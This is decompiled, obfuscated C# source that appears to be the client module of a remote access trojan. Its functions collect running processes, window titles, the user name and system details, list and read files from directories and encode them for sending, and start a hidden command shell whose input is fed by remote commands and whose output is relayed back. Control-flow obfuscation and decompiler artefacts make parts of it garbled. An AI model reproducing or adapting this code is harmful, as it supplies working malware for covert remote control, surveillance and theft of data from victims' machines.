using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

[StandardModule]
internal sealed class ___________________
{
	private static Process _;

	private static bool __ = false;

	public static void _()
	{
		try
		{
			string text = <Module>.____<string>(1157226556u);
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i < processes.Length; i++)
			{
				Process process = processes[i];
				try
				{
					string arg_2C_0 = process.ProcessName;
					string text2;
					try
					{
						text2 = process.MainWindowTitle;
						if (Operators.CompareString(text2, string.Empty, false) == 0)
						{
							text2 = <Module>.______<string>(555695132u);
						}
					}
					catch (System.Exception arg_51_0)
					{
						ProjectData.SetProjectError(arg_51_0);
						text2 = <Module>.___<string>(2354836464u);
						ProjectData.ClearProjectError();
					}
					string text3;
					try
					{
						text3 = process.Modules[0].FileName;
						if (Operators.CompareString(text3, string.Empty, false) == 0)
						{
							text3 = <Module>._______<string>(640289527u);
						}
					}
					catch (System.Exception expr_9A)
					{
						ProjectData.SetProjectError(expr_9A);
						text3 = <Module>._______<string>(640289527u);
						ProjectData.ClearProjectError();
					}
					try
					{
					}
					catch (System.Exception arg_B6_0)
					{
						ProjectData.SetProjectError(arg_B6_0);
						ProjectData.ClearProjectError();
					}
					int id;
					string[] array;
					if ((1963 ^ -(id * 86 + id * 42)) != 0)
					{
						array = new string[9];
						array[0] = text;
						int num = System.Type.EmptyTypes.Length + -30017;
						int arg_10B_0 = -597377024;
						int ________________ = <Module>._________________;
						switch (((arg_10B_0 & ________________ * 1024) == (628 * ________________ + ________________ * 396 & -597377024)) ? (System.Type.EmptyTypes.Length + 0) : (((4764 & id) + 732 == 1817089838) ? (System.Type.EmptyTypes.Length + 2147288645) : (System.Type.EmptyTypes.Length + 1142915169)))
						{
						case 0:
						{
							IL_167:
							array[1] = process.ProcessName;
							array[2] = <Module>.___<string>(1971668521u);
							int num2 = num;
							num = 8028;
							if (num2 != -30017)
							{
								goto IL_1B0;
							}
							string[] arg_1A6_0 = array;
							int arg_1A6_1 = 3;
							id = process.Id;
							arg_1A6_0[arg_1A6_1] = id.ToString();
							if (num != 8225)
							{
								goto IL_1B0;
							}
							goto IL_1B0;
						}
						}
						goto IL_167;
					}
					IL_1B0:
					array[4] = <Module>.______<string>(2515668095u);
					array[5] = text2;
					array[6] = <Module>.______<string>(2515668095u);
					array[7] = text3;
					array[8] = <Module>.____<string>(3008796200u);
					text = string.Concat(array);
				}
				catch (System.Exception arg_1EA_0)
				{
					ProjectData.SetProjectError(arg_1EA_0);
					ProjectData.ClearProjectError();
				}
			}
			______________________________________________________________.____________(text);
		}
		catch (System.Exception arg_20A_0)
		{
			ProjectData.SetProjectError(arg_20A_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void __()
	{
		try
		{
			string text = <Module>._____<string>(471224930u);
			string string_ = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(text + _________________________________________________________________._______() + text, _____________________________________________________________________._________()), text), _________________________________________________________________.______________()), text), _________________________________________________________________.__________________()), text), _________________________________________________________________.___________________()), text), _________________________________________________________________.____________________()), text), System.Environment.UserName), text), _________________________________________________________________.________________()), text), _________________________________________________________________._________________()), text), _________________________________________________________________._______________()), text), _________________________________________________________________._____________()), text), _________________________________________________________________.____________()), text), _________________________________________________________________.__________()), text), _________________________________________________________________.___________()), text), _____________________________________________________________________________.__), text));
			______________________________________________________________._____________(<Module>.____<string>(1779488812u) + ___________________________________________________________________.____(string_));
			System.Threading.Thread arg_13C_0 = new System.Threading.Thread(new System.Threading.ThreadStart(___________________.___));
			__________________________________.____________ = 1648825765;
			System.Threading.Thread thread = arg_13C_0;
			thread.Start();
		}
		catch (System.Exception arg_145_0)
		{
			ProjectData.SetProjectError(arg_145_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void ___()
	{
		int num;
		int num3;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_07:
			int num2 = 2;
			string str = _________________________________________________________________._________();
			IL_0F:
			num2 = 3;
			______________________________________________________________.____________(<Module>._______<string>(2979477093u) + str + <Module>._____<string>(1052623516u));
			IL_30:
			goto IL_8F;
			IL_32:
			int arg_37_0 = num3 + 1;
			num3 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_37_0);
			IL_50:
			goto IL_84;
			num3 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_62:
			goto IL_84;
		}
		object arg_64_0;
		endfilter(arg_64_0 is System.Exception & num != 0 & num3 == 0);
		IL_84:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_8F:
		if (num3 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void ____(string string_0)
	{
		try
		{
			int _______________ = <Module>.________________;
			int arg_13D_0;
			if ((_______________ * -2046820352 - 6655 ^ 2946) == 0)
			{
				arg_13D_0 = sizeof(short) + -2145285158;
				goto IL_125;
			}
			int arg_32_0 = 9170;
			int __________ = <Module>.___________;
			if ((((arg_32_0 + __________ * 408289280 | -11138) == -2050) ? (System.Type.EmptyTypes.Length + -30126) : (System.Type.EmptyTypes.Length + 2111291183)) != -30126)
			{
				goto IL_160;
			}
			IL_109:
			arg_13D_0 = System.Type.EmptyTypes.Length + 63475;
			IL_125:
			string text = <Module>.__________(arg_13D_0, sizeof(System.Guid) + 64410, System.Type.EmptyTypes.Length + 144);
			int i;
			int arg_107_0;
			int __________2;
			if (-(i * 671 + 353 * i) == 6402)
			{
				arg_107_0 = System.Type.EmptyTypes.Length + 1291163002;
			}
			else
			{
				__________2 = <Module>.___________;
				arg_107_0 = ((((uint)__________2 >> 2) * 2986344448u != 4294961448u) ? (((~(__________2 * 633 + 1415 * __________2) / 62 ^ 134222753) == 0) ? ((~(((__________2 << 22) + -3922) * 16384) == __________2 / 256) ? (System.Type.EmptyTypes.Length + 2006367534) : (System.Type.EmptyTypes.Length + 1987608199)) : (System.Type.EmptyTypes.Length + -1458)) : (sizeof(short) + -1329811296));
			}
			if (arg_107_0 != -1458)
			{
				goto IL_109;
			}
			IL_160:
			string[] array;
			if (System.IO.Directory.Exists(______________________.___))
			{
				string text2 = <Module>.____<string>(3631058456u);
				System.IO.DirectoryInfo directoryInfo = new System.IO.DirectoryInfo(______________________.___);
				System.IO.FileInfo[] files = directoryInfo.GetFiles(<Module>.______<string>(2821604880u));
				int j;
				for (j = 0; j < files.Length; j++)
				{
					System.IO.FileInfo fileInfo = files[j];
					try
					{
						int arg_272_0 = 17169;
						int arg_272_1;
						if ((4 & -5896 + (7796 | __________2)) == 4)
						{
							int arg_1D7_0 = 32768;
							int __________3 = <Module>.___________;
							arg_272_1 = ((-(arg_1D7_0 * __________3) + ((__________3 << 13) - 1056) != 5279) ? ((16384 * ((33549024 & __________3) - 9047) - -588709888 == (__________3 ^ __________3)) ? (System.Type.EmptyTypes.Length + -883082793) : (((32 & __________2 + 1037206976 << 5) != (32 & 104160 * __________2)) ? 1706380069 : ((__________3 * 102 + 1946 * __________3 != 2851) ? 17168 : -1668808652))) : 1757704027);
						}
						else
						{
							arg_272_1 = System.Type.EmptyTypes.Length + 2145027821;
						}
						if (arg_272_0 != arg_272_1)
						{
							int num;
							do
							{
								array = new string[7];
								array[0] = text2;
								num = System.Type.EmptyTypes.Length + 5728;
								switch (System.Type.EmptyTypes.Length + 0)
								{
								}
								array[1] = fileInfo.Name;
								array[2] = <Module>.___<string>(2677394803u);
							}
							while (num == 28019);
						}
						array[3] = ____________________.____________(fileInfo.Length).ToString();
						array[4] = <Module>.______<string>(861631917u);
						array[5] = fileInfo.FullName;
						array[6] = <Module>.____<string>(4093950867u);
						text2 = string.Concat(array);
					}
					catch (System.Exception arg_30D_0)
					{
						ProjectData.SetProjectError(arg_30D_0);
						ProjectData.ClearProjectError();
					}
				}
				text = text + text2 + <Module>.______<string>(514244381u);
				int arg_3B0_0 = (((uint)(j * 67108864 - -7504) >> 26) - 79024u != (uint)j) ? 1 : 1841967780;
				while (true)
				{
					switch (arg_3B0_0)
					{
					case 0:
						goto IL_3C3;
					case 2:
						text = <Module>.__________(System.Type.EmptyTypes.Length + 36613, System.Type.EmptyTypes.Length + 37547, System.Type.EmptyTypes.Length + 254);
						arg_3B0_0 = System.Type.EmptyTypes.Length + 0;
						continue;
					}
					if (Operators.CompareString(text, <Module>.___<string>(3948117840u), false) != 0)
					{
						break;
					}
					arg_3B0_0 = System.Type.EmptyTypes.Length + 2;
				}
			}
			IL_3C3:
			if (System.IO.Directory.Exists(______________________._____))
			{
				string text3 = <Module>.___<string>(2536665276u);
				System.IO.DirectoryInfo directoryInfo2 = new System.IO.DirectoryInfo(______________________._____);
				System.IO.FileInfo[] files2 = directoryInfo2.GetFiles(<Module>._______<string>(3308112381u));
				for (i = 0; i < files2.Length; i++)
				{
					System.IO.FileInfo fileInfo2 = files2[i];
					try
					{
						if (~(__________ / 304 / 1073741824) == 0 * __________)
						{
							goto IL_423;
						}
						int num2;
						int num3;
						do
						{
							IL_446:
							array = new string[7];
							array[0] = text3;
							num2 = -20883;
						}
						while (num3 - 1610612736 == num3);
						IL_423:
						array[1] = fileInfo2.Name;
						array[2] = <Module>.____<string>(3008796200u);
						if (num2 != -20883)
						{
							goto IL_446;
						}
						array[3] = ____________________.____________(fileInfo2.Length).ToString();
						array[4] = <Module>.____<string>(3008796200u);
						array[5] = fileInfo2.FullName;
						array[6] = <Module>.____<string>(4093950867u);
						text3 = string.Concat(array);
					}
					catch (System.Exception arg_4AD_0)
					{
						ProjectData.SetProjectError(arg_4AD_0);
						ProjectData.ClearProjectError();
					}
				}
				string arg_4DF_0 = text;
				string arg_4DF_1 = text3;
				uint arg_4DA_0 = 2536665276u;
				__________________________________________________________________________.___ = 1952428595;
				text = arg_4DF_0 + arg_4DF_1 + <Module>.___<string>(arg_4DA_0);
				if (text.Contains(<Module>.___<string>(3564949897u)))
				{
					text = text.Replace(<Module>._______<string>(292283964u), string.Empty);
				}
			}
			text = text + <Module>.____<string>(261875982u) + _____________________________________________________________________.___(string_0) + <Module>.______<string>(2807787963u);
			______________________________________________________________._____________(<Module>._______<string>(2467153886u) + ___________________________________________________________________.____(text));
		}
		catch (System.Exception arg_551_0)
		{
			ProjectData.SetProjectError(arg_551_0);
			ProjectData.ClearProjectError();
		}
	}

	public static string _____()
	{
		string result;
		try
		{
			if (System.IO.Directory.Exists(______________________.___))
			{
				string text = string.Empty;
				System.IO.DirectoryInfo directoryInfo = new System.IO.DirectoryInfo(______________________.___);
				System.IO.FileInfo[] files = directoryInfo.GetFiles(<Module>.____<string>(3168166045u));
				for (int i = 0; i < files.Length; i++)
				{
					System.IO.FileInfo fileInfo = files[i];
					try
					{
						text = text + fileInfo.Name + <Module>._______<string>(1023697363u);
					}
					catch (System.Exception arg_57_0)
					{
						ProjectData.SetProjectError(arg_57_0);
						ProjectData.ClearProjectError();
					}
				}
				if (Operators.CompareString(text, string.Empty, false) != 0)
				{
					result = text;
					return result;
				}
			}
			result = <Module>.______<string>(2154463642u);
		}
		catch (System.Exception expr_89)
		{
			ProjectData.SetProjectError(expr_89);
			System.Exception ex = expr_89;
			______________________________________________________________.______________(<Module>.____<string>(1187660804u), <Module>._____<string>(2381521097u) + ex.ToString());
			result = <Module>._____<string>(1296256311u);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string ______(string string_0)
	{
		string result;
		try
		{
			if (System.IO.File.Exists(______________________.___ + string_0))
			{
				string s = System.IO.File.ReadAllText(______________________.___ + string_0);
				result = System.Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(s));
			}
			else
			{
				result = System.Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(<Module>.____<string>(1073122417u)));
			}
		}
		catch (System.Exception expr_52)
		{
			ProjectData.SetProjectError(expr_52);
			System.Exception ex = expr_52;
			______________________________________________________________.______________(<Module>.___<string>(1387161447u), <Module>.____<string>(3372367348u) + ex.ToString());
			result = System.Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(<Module>.___<string>(157537695u)));
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void _______()
	{
		try
		{
			if (___________________._________())
			{
				______________________________________________________________.____________(<Module>.______<string>(530025909u));
			}
			else
			{
				System.Threading.Thread thread = new System.Threading.Thread(new System.Threading.ThreadStart(___________________.________));
				thread.Start();
			}
		}
		catch (System.Exception expr_32)
		{
			ProjectData.SetProjectError(expr_32);
			ProjectData.ClearProjectError();
		}
	}

	public static void ________()
	{
		try
		{
			ProcessStartInfo processStartInfo;
			int num;
			do
			{
				processStartInfo = new ProcessStartInfo(<Module>._____<string>(1931166709u));
				processStartInfo.WorkingDirectory = <Module>._______<string>(1629533668u);
			}
			while ((2976 ^ num) - 71614464 == (num / 8192 + 3036) * 8192);
			processStartInfo.Arguments = <Module>.______<string>(182638373u);
			processStartInfo.CreateNoWindow = true;
			switch (sizeof(long) + -8)
			{
			case 0:
				IL_75:
				processStartInfo.UseShellExecute = false;
				processStartInfo.RedirectStandardInput = true;
				processStartInfo.RedirectStandardOutput = true;
				goto IL_8A;
			case 1:
				goto IL_8A;
			}
			goto IL_75;
			IL_8A:
			processStartInfo.RedirectStandardError = true;
			___________________._ = Process.Start(processStartInfo);
			___________________.__ = true;
			System.Threading.Thread thread = new System.Threading.Thread(new System.Threading.ThreadStart(___________________.____________));
			thread.Start();
			___________________.___________(<Module>.____<string>(1854754518u));
			______________________________________________________________.____________(<Module>.______<string>(488575158u));
		}
		catch (System.Exception expr_DA)
		{
			ProjectData.SetProjectError(expr_DA);
			______________________________________________________________.____________(<Module>.______<string>(2476181955u));
			ProjectData.ClearProjectError();
		}
	}

	public static bool _________()
	{
		bool result;
		try
		{
			if (___________________._ == null)
			{
				result = false;
			}
			else if (___________________._.HasExited)
			{
				result = false;
			}
			else
			{
				result = true;
			}
		}
		catch (System.Exception arg_1F_0)
		{
			ProjectData.SetProjectError(arg_1F_0);
			result = false;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void __________()
	{
		try
		{
			if (___________________._ != null)
			{
				if (!___________________._.HasExited)
				{
					______________________________________________________________.____________(<Module>.______<string>(2462365038u));
					___________________.__ = false;
					___________________._.Kill();
				}
			}
		}
		catch (System.Exception arg_36_0)
		{
			ProjectData.SetProjectError(arg_36_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void ___________(string string_0)
	{
		try
		{
			___________________._.StandardInput.WriteLine(string_0);
			___________________._.StandardInput.WriteLine();
			___________________._.StandardInput.Flush();
		}
		catch (System.Exception arg_30_0)
		{
			ProjectData.SetProjectError(arg_30_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void ____________()
	{
		try
		{
			bool flag = false;
			___________________._.StandardInput.WriteLine(<Module>.___<string>(2255206222u));
			___________________._.StandardInput.Flush();
			___________________._.StandardOutput.ReadLine();
			int arg_2E6_0 = System.Type.EmptyTypes.Length + 3;
			while (true)
			{
				string text;
				System.Text.StringBuilder stringBuilder;
				string text2;
				switch (arg_2E6_0)
				{
				case 0:
					System.Threading.Thread.CurrentThread.Abort();
					goto IL_BB;
				case 1:
					goto IL_12A;
				case 2:
					if (!string.IsNullOrEmpty(text))
					{
						if (!flag)
						{
							if (flag = text.Contains(<Module>.______<string>(4088767382u)))
							{
								goto IL_2AC;
							}
							int __________;
							if (139 * (__________ / 8) + 117 * (__________ / 8) - -134217728 == 32 * __________)
							{
								goto IL_12A;
							}
						}
						stringBuilder.AppendLine(text);
						break;
					}
					IL_2AC:
					stringBuilder.AppendLine();
					text2 = stringBuilder.ToString();
					arg_2E6_0 = sizeof(long) + -7;
					continue;
				case 3:
					goto IL_67;
				case 4:
					break;
				default:
					goto IL_67;
				}
				text = ___________________._.StandardOutput.ReadLine();
				arg_2E6_0 = sizeof(ulong) + -6;
				continue;
				IL_77:
				if (!___________________.__)
				{
					break;
				}
				if (___________________.__ && ___________________._.HasExited)
				{
					______________________________________________________________.____________(<Module>.___<string>(2960932504u));
					System.Threading.Thread.Sleep(500);
					arg_2E6_0 = sizeof(ushort) + -2;
					continue;
				}
				goto IL_BB;
				IL_12A:
				string arg_271_0 = text2;
				int arg_26B_0 = 11627;
				int arg_26B_1 = 12600;
				int arg_14A_0 = 15;
				int ______________ = <Module>._______________;
				int arg_26B_2;
				if ((arg_14A_0 & ~(______________ * 120 + 8 * ______________)) == 15)
				{
					if (((uint)(______________ * 264 + ______________ * 1784) >> 5 >> 6 & 1u) != (uint)(1 & -(uint)______________))
					{
						arg_26B_2 = System.Type.EmptyTypes.Length + 1538822975;
					}
					else if (-553648128 + (165 ^ ______________) == ______________)
					{
						arg_26B_2 = System.Type.EmptyTypes.Length + -961780388;
					}
					else
					{
						int ______________2 = <Module>._______________;
						int arg_1CC_0 = ______________2 * 1046723648 - 3578 - 266528;
						int arg_1C5_0 = 8;
						int _________ = <Module>.__________;
						if (arg_1CC_0 != (arg_1C5_0 * _________ + 8 * _________) * 4)
						{
							int arg_1DA_0 = 609664;
							int __________ = <Module>.___________;
							arg_26B_2 = ((-(arg_1DA_0 * __________) == 6337) ? checked((int)(unchecked((System.IntPtr)(-1635659423)))) : (System.Type.EmptyTypes.Length + 91));
						}
						else
						{
							arg_26B_2 = System.Type.EmptyTypes.Length + 1146000540;
						}
					}
				}
				else
				{
					arg_26B_2 = ((______________ * 454 + ______________ * 58 - -469762048 != (______________ ^ 4289) << 9) ? (sizeof(short) + -1662734877) : ((((uint)(1420 * ______________ + 5286 + 628 * ______________) >> 11) + 7921u == (uint)______________) ? -1895141614 : (System.Type.EmptyTypes.Length + -1692412010)));
				}
				if (Operators.CompareString(arg_271_0, <Module>.__________(arg_26B_0, arg_26B_1, arg_26B_2), false) != 0)
				{
					______________________________________________________________.____________(<Module>._______<string>(440569610u) + text2.TrimEnd(new char[0]) + <Module>._____<string>(917869336u));
					goto IL_77;
				}
				goto IL_77;
				IL_67:
				___________________._.StandardOutput.ReadLine();
				goto IL_77;
				IL_BB:
				stringBuilder = new System.Text.StringBuilder();
				___________________._.StandardOutput.ReadLine();
				arg_2E6_0 = System.Type.EmptyTypes.Length + 4;
			}
		}
		catch (System.Exception expr_306)
		{
			ProjectData.SetProjectError(expr_306);
			ProjectData.ClearProjectError();
		}
	}
}
